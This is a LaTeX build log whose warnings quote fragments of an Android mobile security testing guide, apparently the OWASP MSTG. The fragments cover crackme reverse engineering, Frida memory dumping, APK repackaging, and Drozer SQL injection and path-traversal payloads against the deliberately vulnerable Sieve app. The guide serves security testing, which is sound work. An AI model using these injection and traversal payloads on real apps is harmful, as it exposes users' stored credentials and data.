0288                     ; [0x1870:4]=0x288 aav.0x00000288[] 

Overfull \hbox (91.16963pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │  │        0x00001858      add r3, pc, r3    
                         ; 0x1ae8 ; "Incorrect serial." ;[] 

Overfull \hbox (84.59966pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │  │        0x0000185c      mov r0, r3        
                         ; 0x1ae8 ; "Incorrect serial." ;[] 

Overfull \hbox (53.93965pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │  │        0x00001860      bl sym.imp.puts   
                         ; int puts(const char *s)[] 

Overfull \hbox (42.98979pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │  │                                          
                         ; int puts("Incorrect serial.")[] 
[271]
Overfull \hbox (115.25963pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 ╰           0x00001868      pop {r4, fp, pc}  
                         ; entry.preinit0 ; entry.preinit0 ;[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/196e63531f9e462f1ab15205845fe2749b783d26.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/444928658f8dea94b4ec067294cc7379daec0908.
png" > [272]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/ece45f74f3b110d8097107d86ef4cda57625332a.
png" > [273] [274]
Overfull \hbox (7.94942pt too wide) in paragraph at lines 15369--15369
[]\TU/SourceCodePro(6)/m/n/10.95 WARNING | cle.loader | The main binary is a po
sition-independent executable.[] 
[275] [276]
Overfull \hbox (124.01938pt too wide) in paragraph at lines 15480--15480
[]\TU/SourceCodePro(6)/m/n/10.95 .method public checkServerTrusted([LJava/secur
ity/cert/X509Certificate;Ljava/lang/String;)V[] 

Overfull \hbox (21.08939pt too wide) in paragraph at lines 15480--15480
[]  \TU/SourceCodePro(6)/m/n/10.95 invoke-virtual {v1}, Ljava/util/ArrayList;->
iterator()Ljava/util/Iterator;[] 
[277]
Underfull \hbox (badness 1147) in paragraph at lines 15505--15511
\TU/SourceSansPro(0)/m/n/10.95 ifest file (AndroidManifest.xml). Once you’ve un
packed the app (e.g. \TU/SourceCodePro(6)/m/n/10.95 apktool d --no-src

Overfull \hbox (21.11864pt too wide) in paragraph at lines 15505--15511
\TU/SourceCodePro(6)/m/n/10.95 UnCrackable-Level1.apk\TU/SourceSansPro(0)/m/n/1
0.95 ) and decoded the Android Manifest, add \TU/SourceCodePro(6)/m/n/10.95 and
roid:debuggable="true"

Overfull \hbox (116.43965pt too wide) in paragraph at lines 15533--15536
[]\TU/SourceSansPro(0)/m/n/10.95 Note that the Android Studio build tools direc
tory must be in the path. It is located at \TU/SourceCodePro(6)/m/n/10.95 [SDK-
Path]/build-tools/[version]\TU/SourceSansPro(0)/m/n/10.95 .

Overfull \hbox (20.45732pt too wide) in paragraph at lines 15540--15545
\TU/SourceSansPro(0)/m/n/10.95 fore, the IDE has already created a debug keysto
re and certificate in \TU/SourceCodePro(6)/m/n/10.95 $HOME/.android/debug.keyst
ore\TU/SourceSansPro(0)/m/n/10.95 .

Overfull \hbox (244.4694pt too wide) in paragraph at lines 15552--15552
[]\TU/SourceCodePro(6)/m/n/10.95 $ keytool -genkey -v -keystore ~/.android/debu
g.keystore -alias signkey -keyalg RSA -keysize 2048 -validity 20000[] 
[278]
Overfull \hbox (156.86937pt too wide) in paragraph at lines 15560--15560
[]\TU/SourceCodePro(6)/m/n/10.95 $ apksigner sign --ks  ~/.android/debug.keysto
re --ks-key-alias signkey UnCrackable-Repackaged.apk[] 

Overfull \hbox (134.96939pt too wide) in paragraph at lines 15569--15569
[]\TU/SourceCodePro(6)/m/n/10.95 $ jarsigner -verbose -keystore ~/.android/debu
g.keystore ../UnCrackable-Repackaged.apk signkey[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/d4138675f1560de187de0888b5d85fc997c30b87.
png" > [279]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/5dca12a550e25ea0d8869ad28a3f1018e7b054bd.
png" > [280]
Overfull \hbox (10.73807pt too wide) in paragraph at lines 15646--15649
[]\TU/SourceSansPro(0)/m/n/10.95 Put the \TU/SourceSansPro(0)/m/it/10.95 patche
d code \TU/SourceSansPro(0)/m/n/10.95 on a single line and copy it in the origi
nal \TU/SourceCodePro(6)/m/n/10.95 assets/index.android.bundle
[281]
Overfull \hbox (27.52444pt too wide) in paragraph at lines 15705--15708
[]\TU/SourceSansPro(0)/m/n/10.95 An Android application’s decompiled smali code
 can be patched to introduce a call to \TU/SourceCodePro(6)/m/n/10.95 System.lo
adLibrary\TU/SourceSansPro(0)/m/n/10.95 .
[282] [283] [284]
Overfull \hbox (29.84938pt too wide) in paragraph at lines 15921--15921
[]\TU/SourceCodePro(6)/m/n/10.95 [Huawei Nexus 6P::sg.vantagepoint.helloworldjn
i]-> Process.enumerateModules()[] 
[285] [286] [287]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/65d9911c121984364aa4dd59d11f9e12cbaba7b1.
png" > [288] [289] [290]
Overfull \hbox (15.5245pt too wide) in paragraph at lines 16161--16161
\TU/SourceCodePro(6)/m/n/10 Base64.[]decode[]((String)[]"5UJiFctbmgbDoLXmpL12mk
no8HT4Lv8dlat8FxR2GOc="[], 
[291] [292]
Overfull \hbox (97.73936pt too wide) in paragraph at lines 16242--16242
[]\TU/SourceCodePro(6)/m/n/10.95 [USB::Android Emulator 5554::sg.vantagepoint.u
ncrackable1]-> [*] MainActivity.a modified[] 
[293] [294]
Overfull \hbox (12.32942pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 sg.vantagepoint.helloworldjni on (google: 8.1.
0) [usb] # memory list modules[] 

Overfull \hbox (522.59837pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 ----------------------------------------------
-  ------------  --------------------  ----------------------------------------
----------------------------[] 

Overfull \hbox (152.48962pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 app_process64                                 
   0x558b1fd000  32768 (32.0 KiB)      /system/bin/app_process64[] 
[295]
Overfull \hbox (237.89957pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 libandroid_runtime.so                         
   0x7dbc859000  1982464 (1.9 MiB)     /system/lib64/libandroid_runtime.so[] 

Overfull \hbox (161.2496pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 libbinder.so                                  
   0x7dbf5d7000  557056 (544.0 KiB)    /system/lib64/libbinder.so[] 

Overfull \hbox (156.86963pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 libcutils.so                                  
   0x7dbff4d000  77824 (76.0 KiB)      /system/lib64/libcutils.so[] 

Overfull \hbox (178.76959pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 libhwbinder.so                                
   0x7dbfd13000  163840 (160.0 KiB)    /system/lib64/libhwbinder.so[] 

Overfull \hbox (384.62955pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 base.odex                                     
   0x7d10dd0000  442368 (432.0 KiB)    /data/app/sg.vantagepoint.helloworldjni-
1/oat/arm64/base.odex[] 

Overfull \hbox (441.56952pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 libnative-lib.so                              
   0x7d1c499000  73728 (72.0 KiB)      /data/app/sg.vantagepoint.helloworldjni-
1/lib/arm64/libnative-lib.so[] 

Overfull \hbox (34.01901pt too wide) in paragraph at lines 16416--16420
[]\TU/SourceSansPro(0)/m/n/10.95 You can adjust your search by using the search
 settings \TU/SourceCodePro(6)/m/n/10.95 \e~search\TU/SourceSansPro(0)/m/n/10.9
5 . For example, \TU/SourceCodePro(6)/m/n/10.95 \e search.quiet=true;
[296] [297] [298]
Overfull \hbox (200.66937pt too wide) in paragraph at lines 16559--16559
[]\TU/SourceCodePro(6)/m/n/10.95 sg.vantagepoint.helloworldjni on (google: 8.1.
0) [usb] # memory dump all /Users/foo/memory_Android/memory[] 

Overfull \hbox (408.71915pt too wide) in paragraph at lines 16559--16559
[]\TU/SourceCodePro(6)/m/n/10.95 Dumping 1002.8 MiB from base: 0x14140000  [---
---------------------------------]    0%  00:11:03(session detach message) proc
ess-terminated[] 

Overfull \hbox (69.26944pt too wide) in paragraph at lines 16559--16559
[]\TU/SourceCodePro(6)/m/n/10.95 Dumping 8.0 MiB from base: 0x7fc753e000  [####
################################]  100%[] 
[299]
Overfull \hbox (125.82916pt too wide) in paragraph at lines 16642--16646
[]\TU/SourceSansPro(0)/m/n/10.95 We’ll keep using the HelloWorld JNI app, open 
a session with r2frida \TU/SourceCodePro(6)/m/n/10.95 r2 frida://usb//sg.vantag
epoint.helloworldjni
[300]
Overfull \hbox (88.97942pt too wide) in paragraph at lines 16674--16674
[]\TU/SourceCodePro(6)/m/n/10.95 extCacheDir         /storage/emulated/0/Androi
d/data/sg.vantagepoint.helloworldjni/cache[] 

Overfull \hbox (32.03943pt too wide) in paragraph at lines 16674--16674
[]\TU/SourceCodePro(6)/m/n/10.95 obbDir              /storage/emulated/0/Androi
d/obb/sg.vantagepoint.helloworldjni[] 
[301]
Overfull \hbox (117.44937pt too wide) in paragraph at lines 16732--16732
[]\TU/SourceCodePro(6)/m/n/10.95 [0x00000000]> \ic sg.vantagepoint.helloworldjn
i.MainActivity~sg.vantagepoint.helloworldjni[] 

Overfull \hbox (108.68938pt too wide) in paragraph at lines 16732--16732
[]\TU/SourceCodePro(6)/m/n/10.95 public native java.lang.String sg.vantagepoint
.helloworldjni.MainActivity.stringFromJNI()[] 

Overfull \hbox (67.07942pt too wide) in paragraph at lines 16788--16788
[]            \TU/SourceCodePro(6)/m/n/10.95 ;-- sym.fun.Java_sg_vantagepoint_h
elloworldjni_MainActivity_stringFromJNI:[] 
[302]
Overfull \hbox (53.93956pt too wide) in paragraph at lines 16788--16788
[]\TU/SourceCodePro(6)/m/n/10.95 │           0x7d1c499558      029d42f9       l
dr x2, [x8, 0x538]       ; [0x538:4]=-1 ; 1336[] 
[303] [304]
Overfull \hbox (279.50932pt too wide) in paragraph at lines 16882--16882
[]\TU/SourceCodePro(6)/m/n/10.95 cmdline = console=ttyHSL0,115200,n8 androidboo
t.hardware=hammerhead user_debug=31 maxcpus=2 msm_watchdog_v2.enable=1[] 
[305] [306]
Overfull \hbox (277.3193pt too wide) in paragraph at lines 16994--16994
[]\TU/SourceCodePro(6)/m/n/10.95 $ build/tools/make-standalone-toolchain.sh --a
rch=arm --platform=android-24 --install-dir=/tmp/my-android-toolchain[] 

Overfull \hbox (23.27953pt too wide) in paragraph at lines 17019--17019
[]\TU/SourceCodePro(6)/m/n/10.95 lrwxrwxrwx root     root              1970-08-
30 22:31 DDR -> /dev/block/mmcblk0p24[] 

Overfull \hbox (29.84952pt too wide) in paragraph at lines 17019--17019
[]\TU/SourceCodePro(6)/m/n/10.95 lrwxrwxrwx root     root              1970-08-
30 22:31 aboot -> /dev/block/mmcblk0p6[] 

Overfull \hbox (42.98952pt too wide) in paragraph at lines 17019--17019
[]\TU/SourceCodePro(6)/m/n/10.95 lrwxrwxrwx root     root              1970-08-
30 22:31 abootb -> /dev/block/mmcblk0p11[] 

Overfull \hbox (29.84953pt too wide) in paragraph at lines 17019--17019
[]\TU/SourceCodePro(6)/m/n/10.95 lrwxrwxrwx root     root              1970-08-
30 22:31 boot -> /dev/block/mmcblk0p19[] 

Overfull \hbox (56.12952pt too wide) in paragraph at lines 17019--17019
[]\TU/SourceCodePro(6)/m/n/10.95 lrwxrwxrwx root     root              1970-08-
30 22:31 userdata -> /dev/block/mmcblk0p28[] 

Overfull \hbox (7.9494pt too wide) in paragraph at lines 17026--17026
[]\TU/SourceCodePro(6)/m/n/10.95 $ adb shell "su -c dd if=/dev/block/mmcblk0p19
 of=/data/local/tmp/boot.img"[] 
[307]
Overfull \hbox (1015.3492pt too wide) in paragraph at lines 17057--17057
[]\TU/SourceCodePro(6)/m/n/10.95 $ fastboot boot zImage-dtb initrd.img --base 0
 --kernel-offset 0x8000 --ramdisk-offset 0x2900000 --tags-offset 0x2700000 -c "
console=ttyHSL0,115200,n8 androidboot.hardware=hammerhead user_debug=31 maxcpus
=2 msm_watchdog_v2.enable=1"[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/79cc611a9662b42c800f698e259e4a68828ed1c9.
jpg" > [308]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/2b3a00354d9a95a605f5ab9905e3b4d4e39d9c5a.
jpg" > [309]
Overfull \hbox (26.24696pt too wide) in paragraph at lines 17122--17125
[]\TU/SourceSansPro(0)/m/n/10.95 You can find the function prototypes for all s
ystem calls in the kernel header file arch/arm/include/asm/unistd.h.
[310] [311]
Overfull \hbox (290.45944pt too wide) in paragraph at lines 17183--17183
[]        \TU/SourceCodePro(6)/m/n/10.95 make ARCH=arm CROSS_COMPILE=$(TOOLCHAI
N)/bin/arm-eabi- -C $(KERNEL) M=$(shell pwd) CFLAGS_MODULE=-fno-pic modules[] 
[312] [313]
Overfull \hbox (128.3994pt too wide) in paragraph at lines 17275--17275
[]\TU/SourceCodePro(6)/m/n/10.95 $ /tmp/my-android-toolchain/bin/arm-linux-andr
oideabi-gcc -pie -fpie -o kmem_util kmem_util.c[] 
[314]
Underfull \hbox (badness 2205) in paragraph at lines 17339--17342
[]\TU/SourceSansPro(0)/m/n/10.95 Attacking Android Applications with Debuggers 
(19 January 2015) - [][]$[][][][][] [] [] [] [][][][] [] [][][][][][] [] [][][]
 []

Underfull \hbox (badness 4886) in paragraph at lines 17345--17348
[]\TU/SourceSansPro(0)/m/n/10.95 Update on Development of Xposed for Nougat - [
][]$[][][][][] [] [] [] [][][] [] [][][] [][] [][][][][][][][][][] [] [][][] []
 [][][][][][] [][]
[315] [316]
Overfull \hbox (100.98427pt too wide) in paragraph at lines 17509--17511
[]\TU/SourceSansPro(0)/m/n/10.95 The username and password are stored in clear 
text in \TU/SourceCodePro(6)/m/n/10.95 /data/data/<package-name>/shared_prefs/k
ey.xml\TU/SourceSansPro(0)/m/n/10.95 . 
[317]
Overfull \hbox (10.13937pt too wide) in paragraph at lines 17533--17533
[]\TU/SourceCodePro(6)/m/n/10.95 root@hermes:/data/data/sg.vp.owasp_mobile.myfi
rstapp/shared_prefs # ls -la[] 

Overfull \hbox (79.92378pt too wide) in paragraph at lines 17563--17567
\TU/SourceSansPro(0)/m/n/10.95 vided data and stored in the clear text file \TU
/SourceCodePro(6)/m/n/10.95 /data/data/<package-name>/databases/privateNotSoSec
ure\TU/SourceSansPro(0)/m/n/10.95 . 
[318] [319]
Underfull \hbox (badness 6063) in paragraph at lines 17709--17713
\TU/SourceSansPro(0)/m/n/10.95 this access with \TU/SourceCodePro(6)/m/n/10.95 
MODE_PRIVATE\TU/SourceSansPro(0)/m/n/10.95 . Modes such as \TU/SourceCodePro(6)
/m/n/10.95 MODE_WORLD_READABLE \TU/SourceSansPro(0)/m/n/10.95 (deprecated) and
[320]
Overfull \hbox (10.26721pt too wide) in paragraph at lines 17756--17764
[]\TU/SourceSansPro(0)/m/n/10.95 It’s also worth knowing that files stored outs
ide the application folder (\TU/SourceCodePro(6)/m/n/10.95 data/data/<package-n
ame>/\TU/SourceSansPro(0)/m/n/10.95 )

Underfull \hbox (badness 3291) in paragraph at lines 17779--17783
[]\TU/SourceSansPro(0)/m/n/10.95 Check \TU/SourceCodePro(6)/m/n/10.95 AndroidMa
nifest.xml \TU/SourceSansPro(0)/m/n/10.95 for read/write external storage permi
ssions, for example,

Overfull \hbox (29.5756pt too wide) in paragraph at lines 17779--17783
\TU/SourceCodePro(6)/m/n/10.95 uses-permission android:name="android.permission
.WRITE_EXTERNAL_STORAGE"\TU/SourceSansPro(0)/m/n/10.95 . 

Underfull \hbox (badness 5008) in paragraph at lines 17794--17802
[]\TU/SourceCodePro(6)/m/n/10.95 MODE_WORLD_READABLE \TU/SourceSansPro(0)/m/n/1
0.95 or \TU/SourceCodePro(6)/m/n/10.95 MODE_WORLD_WRITABLE\TU/SourceSansPro(0)/
m/n/10.95 : You should avoid using
[321] [322]
Overfull \hbox (15.61441pt too wide) in paragraph at lines 17920--17920
 []    \TU/SourceCodePro(6)/m/n/10.95 buildConfigField "String", "hiddenPasswor
d", "\"${hiddenPassword}\""[] 
[323]
Underfull \hbox (badness 1127) in paragraph at lines 17979--17991
\TU/SourceSansPro(0)/m/n/10.95 droid 9 (API level 28) introduces the \TU/Source
CodePro(6)/m/n/10.95 unlockedDeviceRequied \TU/SourceSansPro(0)/m/n/10.95 flag.
 By passing \TU/SourceCodePro(6)/m/n/10.95 true \TU/SourceSansPro(0)/m/n/10.95 
to the
[324]
Overfull \hbox (82.96791pt too wide) in paragraph at lines 18063--18068
\TU/SourceSansPro(0)/m/n/10.95 the server and should then retrieve the attestat
ion certificate chain using the \TU/SourceCodePro(6)/m/n/10.95 KeyStore.getCert
ificateChain
[325]
Overfull \hbox (159.5245pt too wide) in paragraph at lines 18135--18135
[]\TU/SourceCodePro(6)/m/n/10 "308202ca30820270a003020102020101300a06082a8648ce
3d040302308188310b30090603550406130..."[][],[]|  

Overfull \hbox (159.5245pt too wide) in paragraph at lines 18136--18136
[]\TU/SourceCodePro(6)/m/n/10 "308202783082021ea00302010202021001300a06082a8648
ce3d040302308198310b300906035504061..."[][],[]|  

Overfull \hbox (153.5245pt too wide) in paragraph at lines 18137--18137
[]\TU/SourceCodePro(6)/m/n/10 "3082028b30820232a003020102020900a2059ed10e435b57
300a06082a8648ce3d040302308198310b3..."[]|  
[326] [327]
Underfull \hbox (badness 1596) in paragraph at lines 18277--18284
[]\TU/SourceSansPro(0)/m/n/10.95 Make sure that the app is using the Android Ke
yStore and Cipher mechanisms to securely

Underfull \hbox (badness 4846) in paragraph at lines 18277--18284
\TU/SourceSansPro(0)/m/n/10.95 store encrypted information on the device. Look 
for the patterns \TU/SourceCodePro(6)/m/n/10.95 AndroidKeystore\TU/SourceSansPr
o(0)/m/n/10.95 ,

Underfull \hbox (badness 3861) in paragraph at lines 18277--18284
\TU/SourceCodePro(6)/m/n/10.95 import java.security.KeyStore\TU/SourceSansPro(0
)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 import javax.crypto.Cipher\TU/Sour
ceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 import
[328] [329] [330]
Overfull \hbox (61.24603pt too wide) in paragraph at lines 18463--18473
[]\TU/SourceSansPro(0)/m/n/10.95 Check Shared Preferences that are stored as XM
L files (in \TU/SourceCodePro(6)/m/n/10.95 /data/data/<package-name>/shared_pre
fs\TU/SourceSansPro(0)/m/n/10.95 )

Overfull \hbox (0.60928pt too wide) in paragraph at lines 18480--18487
[]\TU/SourceSansPro(0)/m/n/10.95 Determine whether a Realm database is availabl
e in \TU/SourceCodePro(6)/m/n/10.95 /data/data/<package-name>/files/\TU/SourceS
ansPro(0)/m/n/10.95 ,
[331] [332]
Underfull \hbox (badness 1946) in paragraph at lines 18569--18571
[]\TU/SourceSansPro(0)/m/n/10.95 You should check the apps’ source code for log
ging mechanisms by searching for the following

Underfull \hbox (badness 1231) in paragraph at lines 18611--18619
\TU/SourceSansPro(0)/m/n/10.95 check the ProGuard configuration file (proguard-
rules.pro) for the following options (according to
[333]
Underfull \hbox (badness 2846) in paragraph at lines 18656--18661
[]\TU/SourceSansPro(0)/m/n/10.95 ProGuard guarantees removal of the \TU/SourceC
odePro(6)/m/n/10.95 Log.v \TU/SourceSansPro(0)/m/n/10.95 method call. Whether t
he rest of the code (\TU/SourceCodePro(6)/m/n/10.95 new

Underfull \hbox (badness 1005) in paragraph at lines 18688--18697
[]\TU/SourceSansPro(0)/m/n/10.95 Many application developers still use \TU/Sour
ceCodePro(6)/m/n/10.95 System.out.println \TU/SourceSansPro(0)/m/n/10.95 or \TU
/SourceCodePro(6)/m/n/10.95 printStackTrace \TU/SourceSansPro(0)/m/n/10.95 inst
ead of

Underfull \hbox (badness 1199) in paragraph at lines 18688--18697
\TU/SourceSansPro(0)/m/n/10.95 a proper logging class. Therefore, your testing 
strategy must include all output generated while

Underfull \hbox (badness 2150) in paragraph at lines 18688--18697
\TU/SourceSansPro(0)/m/n/10.95 the application is starting, running and closing
. To determine what data is directly printed by
[334]
Overfull \hbox (12.3294pt too wide) in paragraph at lines 18703--18703
[]\TU/SourceCodePro(6)/m/n/10.95 $ adb logcat | grep "$(adb shell ps | grep <pa
ckage-name> | awk []{print $2}[])"[] 

Underfull \hbox (badness 1052) in paragraph at lines 18710--18715
[]\TU/SourceSansPro(0)/m/n/10.95 You may also want to apply further filters or 
regular expressions (using \TU/SourceCodePro(6)/m/n/10.95 logcat\TU/SourceSansP
ro(0)/m/n/10.95 ’s regex flags \TU/SourceCodePro(6)/m/n/10.95 -e
[335] [336]
Overfull \hbox (21.40335pt too wide) in paragraph at lines 18856--18869
\TU/SourceSansPro(0)/m/n/10.95 use \TU/SourceCodePro(6)/m/n/10.95 android:permi
ssion\TU/SourceSansPro(0)/m/n/10.95 , other applications must declare correspon
ding \TU/SourceCodePro(6)/m/n/10.95 <uses-permission>

Overfull \hbox (100.0037pt too wide) in paragraph at lines 18856--18869
\TU/SourceSansPro(0)/m/n/10.95 elements in their manifests to interact with you
r content provider. You can use the \TU/SourceCodePro(6)/m/n/10.95 android:gran
tUriPermissions

Overfull \hbox (65.1985pt too wide) in paragraph at lines 18856--18869
\TU/SourceSansPro(0)/m/n/10.95 attribute to grant more specific access to other
 apps; you can limit access with the \TU/SourceCodePro(6)/m/n/10.95 <grant-uri-
permission>
[337]
Underfull \hbox (badness 1540) in paragraph at lines 18904--18907
[]\TU/SourceSansPro(0)/m/n/10.95 We will use the vulnerable password manager ap
p [][]Sieve[][] as an example of a vulnerable content
[338] [339]
Overfull \hbox (1.56197pt too wide) in paragraph at lines 19011--19014
[]\TU/SourceSansPro(0)/m/n/10.95 To identify content provider URIs within the a
pplication, use Drozer’s \TU/SourceCodePro(6)/m/n/10.95 scanner.provider.findur
is

Overfull \hbox (165.62936pt too wide) in paragraph at lines 19037--19037
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.query content://com.mwr.e
xample.sieve.DBContentProvider/Passwords/ --vertical[] 
[340]
Underfull \hbox (badness 2573) in paragraph at lines 19075--19080
\TU/SourceSansPro(0)/m/n/10.95 are based on SQL, they may be vulnerable to SQL 
injection. You can use the Drozer module

Underfull \hbox (badness 2582) in paragraph at lines 19075--19080
\TU/SourceCodePro(6)/m/n/10.95 app.provider.query \TU/SourceSansPro(0)/m/n/10.9
5 to test for SQL injection by manipulating the projection and selection

Overfull \hbox (202.85933pt too wide) in paragraph at lines 19087--19087
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.query content://com.mwr.e
xample.sieve.DBContentProvider/Passwords/ --projection "[]"[] 

Overfull \hbox (99.92941pt too wide) in paragraph at lines 19087--19087
[]\TU/SourceCodePro(6)/m/n/10.95 unrecognized token: "[] FROM Passwords" (code 
1): , while compiling: SELECT [] FROM Passwords[] 

Overfull \hbox (196.28934pt too wide) in paragraph at lines 19087--19087
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.query content://com.mwr.e
xample.sieve.DBContentProvider/Passwords/ --selection "[]"[] 

Overfull \hbox (73.6494pt too wide) in paragraph at lines 19087--19087
[]\TU/SourceCodePro(6)/m/n/10.95 unrecognized token: "[])" (code 1): , while co
mpiling: SELECT * FROM Passwords WHERE ([])[] 

Overfull \hbox (196.28935pt too wide) in paragraph at lines 19102--19102
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.query content://com.mwr.e
xample.sieve.DBContentProvider/Passwords/ --projection "*[] 
[341]
Overfull \hbox (277.31935pt too wide) in paragraph at lines 19111--19111
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.query content://com.mwr.e
xample.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;--"[] 

Overfull \hbox (566.39923pt too wide) in paragraph at lines 19145--19145
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.download content://com.vu
lnerable.app.FileProvider/../../../../../../../../data/data/com.vulnerable.app/
database.db /home/user/database.db[] 

Underfull \hbox (badness 1789) in paragraph at lines 19147--19150
[]\TU/SourceSansPro(0)/m/n/10.95 Use the \TU/SourceCodePro(6)/m/n/10.95 scanner
.provider.traversal \TU/SourceSansPro(0)/m/n/10.95 module to automate the proce
ss of finding content
[342]
Overfull \hbox (194.09937pt too wide) in paragraph at lines 19166--19166
[]\TU/SourceCodePro(6)/m/n/10.95 $ adb shell content query --uri content://com.
owaspomtg.vulnapp.provider.CredentialProvider/credentials[] 
[343] [344] [345]
Overfull \hbox (327.68936pt too wide) in paragraph at lines 19407--19407
[]\TU/SourceCodePro(6)/m/n/10.95 $ dd if=backup.ab bs=1 skip=24 | python -c "im
port zlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))" > backup.tar
[] 

Overfull \hbox (7.94939pt too wide) in paragraph at lines 19430--19430
[]\TU/SourceCodePro(6)/m/n/10.95 $ abe [-debug] [-useenv=yourenv] unpack <backu
p.ab> <backup.tar> [password][] 
[346]
Overfull \hbox (69.62175pt too wide) in paragraph at lines 19511--19514
[]\TU/SourceSansPro(0)/m/n/10.95 [Images/Chapters/0x05d/2.png](Images/Chapters/
0x05d/1.png” 

Overfull \hbox (136.94234pt too wide) in paragraph at lines 19511--19514
\TU/SourceSansPro(0)/m/n/10.95 width=“500px](Images/Chapters/0x05d/2.png](Image
s/Chapters/0x05d/1.png” 
[347]
Overfull \hbox (176.03922pt too wide) in paragraph at lines 19518--19527
[]\TU/SourceSansPro(0)/m/n/10.95 On devices supporting [][]file-based encryptio
n (FBE)[][], snapshots are stored in the \TU/SourceCodePro(6)/m/n/10.95 /data/s
ystem_ce/<USER_ID>/<IMAGE_FOLDER_NAME>

Overfull \hbox (17.3786pt too wide) in paragraph at lines 19518--19527
\TU/SourceSansPro(0)/m/n/10.95 and \TU/SourceCodePro(6)/m/n/10.95 recent_images
\TU/SourceSansPro(0)/m/n/10.95 . If the device doesn’t support FBE, the \TU/Sou
rceCodePro(6)/m/n/10.95 /data/system/<IMAGE_FOLDER_NAME>
[348] [349] [350] [351] [352] [353] [354]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/e9acff65016bb9e041e6fed3ec844f8e4df0cae9.
png" > [355]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/5714378441f6a767b5bf09078d621a244d4d9fc2.
png" > [356] [357] [358]
Underfull \hbox (badness 10000) in paragraph at lines 20219--20222
[]\TU/SourceSansPro(0)/m/n/10.95 Memory Monitor - [][]$[][][][] [] [] [] [][][]
[][][][][][] [] [][][][][][][] [] [][][] [] [][][][][] [] [][][][][][][][][] []
 [][][][][][][][][] [][] [][][][][][] [] [][][][] []
[359]
Underfull \hbox (badness 1112) in paragraph at lines 20281--20290
[]\TU/SourceSansPro(0)/m/n/10.95 Android cryptography APIs are based on the Jav
a Cryptography Architecture (JCA). JCA separates
[360]
Underfull \hbox (badness 1540) in paragraph at lines 20364--20373
[]\TU/SourceSansPro(0)/m/n/10.95 Conscrypt, known as \TU/SourceCodePro(6)/m/n/1
0.95 AndroidOpenSSL\TU/SourceSansPro(0)/m/n/10.95 , is preferred above using Bo
uncy Castle and

Underfull \hbox (badness 2042) in paragraph at lines 20364--20373
\TU/SourceSansPro(0)/m/n/10.95 it has new implementations: \TU/SourceCodePro(6)
/m/n/10.95 AlgorithmParameters:GCM \TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceC
odePro(6)/m/n/10.95 KeyGenerator:AES\TU/SourceSansPro(0)/m/n/10.95 ,

Underfull \hbox (badness 10000) in paragraph at lines 20364--20373
\TU/SourceCodePro(6)/m/n/10.95 KeyGenerator:DESEDE\TU/SourceSansPro(0)/m/n/10.9
5 , \TU/SourceCodePro(6)/m/n/10.95 KeyGenerator:HMACMD5\TU/SourceSansPro(0)/m/n
/10.95 , \TU/SourceCodePro(6)/m/n/10.95 KeyGenerator:HMACSHA1\TU/SourceSansPro(
0)/m/n/10.95 ,

Overfull \hbox (45.35818pt too wide) in paragraph at lines 20364--20373
\TU/SourceCodePro(6)/m/n/10.95 KeyGenerator:HMACSHA224\TU/SourceSansPro(0)/m/n/
10.95 , \TU/SourceCodePro(6)/m/n/10.95 KeyGenerator:HMACSHA256\TU/SourceSansPro
(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 KeyGenerator:HMACSHA384\TU/Sourc
eSansPro(0)/m/n/10.95 ,

Overfull \hbox (63.71037pt too wide) in paragraph at lines 20364--20373
\TU/SourceCodePro(6)/m/n/10.95 KeyGenerator:HMACSHA512\TU/SourceSansPro(0)/m/n/
10.95 , \TU/SourceCodePro(6)/m/n/10.95 SecretKeyFactory:DESEDE\TU/SourceSansPro
(0)/m/n/10.95 , and \TU/SourceCodePro(6)/m/n/10.95 Signature:NONEWITHECDSA\TU/S
ourceSansPro(0)/m/n/10.95 . 

Underfull \hbox (badness 2990) in paragraph at lines 20373--20376
[]\TU/SourceSansPro(0)/m/n/10.95 You should not use the \TU/SourceCodePro(6)/m/
n/10.95 IvParameterSpec.class \TU/SourceSansPro(0)/m/n/10.95 anymore for GCM, b
ut use the

Overfull \hbox (22.53477pt too wide) in paragraph at lines 20376--20380
[]\TU/SourceSansPro(0)/m/n/10.95 Sockets have changed from \TU/SourceCodePro(6)
